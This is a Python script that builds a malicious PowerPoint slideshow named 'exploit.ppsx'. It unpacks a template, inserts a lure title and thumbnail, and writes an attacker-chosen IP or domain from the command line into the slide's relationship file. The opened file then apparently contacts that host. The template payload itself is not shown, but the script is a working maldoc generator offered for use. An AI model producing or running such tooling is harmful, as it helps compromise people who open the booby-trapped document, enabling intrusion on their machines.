import shutil,zipfile
import os,sys,socket

if sys.argv[1]:
	f = open('ppsx_title.txt','r')
	new_title = f.read()
	new_ip = sys.argv[1]
	print new_ip
else:
	print '#Please choose a domain:'

def replace_title(new_title):
	f =open('ppt\slides\slide1.xml','r')
	data = f.read()
	f.close()
	if data.find("TTIITTLLEE")>-1:
		a = data.replace("TTIITTLLEE",new_title)
		f = open('ppt\slides\slide1.xml','w')
		f.write(a)
		f.close()

def replace_respnoseip(new_ip):
	f =open('ppt\slides\_rels\slide1.xml.rels','r')
	data = f.read()
	f.close()
	if data.find("RESPONSEIP")>-1:
		a = data.replace("RESPONSEIP",new_ip)
		f = open('ppt\slides\_rels\slide1.xml.rels','w')
		f.write(a)
		f.close()

def replace_image():
	if os.path.exists(os.getcwd().replace('\\','\\\\') + '\\thumbnail.jpg'):
		os.remove(os.getcwd().replace('\\','\\\\') + '\\docProps\\thumbnail.jpeg')
		shutil.copy2('thumbnail.jpg','docProps/thumbnail.jpeg')
		#os.rename(os.getcwd().replace('\\','\\\\') + '\\docProps\\c.jpg',os.getcwd().replace('\\','\\\\') + '\\docProps\\thumbnail.jpeg')
	else:
		return

def replace_theme(FILE):
	zipFile = zipfile.ZipFile(os.path.join(os.getcwd(),FILE))
	zipFile.extractall()
	zipFile.close()
	#shutil.rmtree(os.getcwd().replace('\\','\\\\') + '\\newppsxfile\\ppt\\media')
	shutil.rmtree(os.getcwd().replace('\\','\\\\') + '\\newppsxfile\\ppt\\slideLayouts')
	shutil.rmtree(os.getcwd().replace('\\','\\\\') + '\\newppsxfile\\ppt\\slideMasters')
	shutil.rmtree(os.getcwd().replace('\\','\\\\') + '\\newppsxfile\\ppt\\theme')
	#shutil.copytree(os.getcwd().replace('\\','\\\\')+'\\ppt\\media',os.getcwd().replace('\\','\\\\')+'\\newppsxfile\\ppt\\media')
	shutil.copytree(os.getcwd().replace('\\','\\\\')+'\\ppt\\slideLayouts',os.getcwd().replace('\\','\\\\')+'\\newppsxfile\\ppt\\slideLayouts')
	shutil.copytree(os.getcwd().replace('\\','\\\\')+'\\ppt\\slideMasters',os.getcwd().replace('\\','\\\\')+'\\newppsxfile\\ppt\\slideMasters')
	shutil.copytree(os.getcwd().replace('\\','\\\\')+'\\ppt\\theme',os.getcwd().replace('\\','\\\\')+'\\newppsxfile\\ppt\\theme')

def copyfile():
	if not os.path.exists(os.getcwd().replace('\\','\\\\') + '\\newppsxfile'):
		os.mkdir(os.getcwd().replace('\\','\\\\') + '\\newppsxfile')
		shutil.copytree(os.getcwd().replace('\\','\\\\')+'\\_rels',os.getcwd().replace('\\','\\\\')+'\\newppsxfile\\_rels')
		shutil.copytree(os.getcwd().replace('\\','\\\\')+'\\docProps',os.getcwd().replace('\\','\\\\')+'\\newppsxfile\\docProps')
		shutil.copytree(os.getcwd().replace('\\','\\\\')+'\\ppt',os.getcwd().replace('\\','\\\\')+'\\newppsxfile\\ppt')
		shutil.copy2('[Content_Types].xml', 'newppsxfile/[Content_Types].xml')


def cleardir():
	if os.path.exists(os.getcwd().replace('\\','\\\\') + '\\[Content_Types].xml'):
		os.remove(os.getcwd().replace('\\','\\\\') + '\\[Content_Types].xml')
		shutil.rmtree(os.getcwd().replace('\\','\\\\') + '\\_rels')
		shutil.rmtree(os.getcwd().replace('\\','\\\\') + '\\docProps')
		shutil.rmtree(os.getcwd().replace('\\','\\\\') + '\\ppt')

def packzip():
	azip = zipfile.ZipFile('exploit.ppsx','w')
	for current_path, subfolders, filesname in os.walk(r'newppsxfile/'):
		print(current_path, subfolders, filesname)
		for file in filesname:
			zip_name = os.path.join(current_path, file)
			azip.write(zip_name.replace("newppsxfile/", ""))

if __name__ == '__main__':
	if os.path.exists(os.getcwd().replace('\\','\\\\') + '\\newppsxfile'):
		shutil.rmtree(os.getcwd().replace('\\','\\\\') + '\\newppsxfile')
	shutil.copy2('temp/0.ppsx', 'talk.zip')
	zipFile = zipfile.ZipFile(os.path.join(os.getcwd(), 'talk.zip'))
	zipFile.extractall()
	zipFile.close()
	replace_title(new_title)
	replace_respnoseip(new_ip)
	replace_image()
	copyfile()
	# if os.path.exists(os.getcwd().replace('\\','\\\\') + '\\1.ppsx'):
		# replace_theme(FILE)
	packzip()
	cleardir()
	shutil.rmtree(os.getcwd().replace('\\','\\\\') + '\\newppsxfile')
	os.remove(os.getcwd().replace('\\','\\\\') + '\\talk.zip')
	print 'Finished!'
